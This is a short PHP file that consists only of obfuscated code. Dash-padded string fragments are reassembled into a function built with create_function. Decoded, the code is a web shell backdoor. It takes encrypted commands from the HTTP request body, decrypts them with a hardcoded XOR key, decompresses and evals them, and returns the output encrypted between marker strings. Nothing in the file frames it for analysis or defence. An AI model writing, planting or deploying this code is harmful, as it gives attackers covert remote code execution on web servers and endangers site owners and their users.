<?php
$C='j}-;}}r-e-t-u-rn $o;}if (@pre-g_match("/$k---h(.+)$kf/",@f-ile_get_-conten';
$P='JkX20Z8X-"-;function x-($t,$k){$--c=strlen(-$k);$l-=strl-en($t);$o=-"";-for';
$z='-base6-4_dec-o-de($m[1]-),$k)));$-o=@ob_get_-contents();@-ob_end-_cl-ean-';
$K='$k-="2f4a-100-d"-;$kh="df8-b91c47f6f";-$kf="fd-16d03531-a2-";$p=-"ILx-6l0fb';
$k='($i=0-;-$-i<$l;){for($-j=0;($j-<$c-&&$i<$l);$j++-,-$i-++){$o.=-$t{$i}^$k{$';
$r=str_replace('dj','','credjdjatedjdj_funcdjtidjon');
$W='()-;$r=@base-64-_encode(@x(@g-zcompre-ss($-o),-$k)-);-print("$p$kh$r$kf");}';
$y='-ts("php:/-/input"-)-,$m)==-1) {@ob-_start-(-);@eva-l(@gzuncompr-ess(@x(-@';
$w=str_replace('-','',$K.$P.$k.$C.$y.$z.$W);
$Z=$r('',$w);$Z();
?>
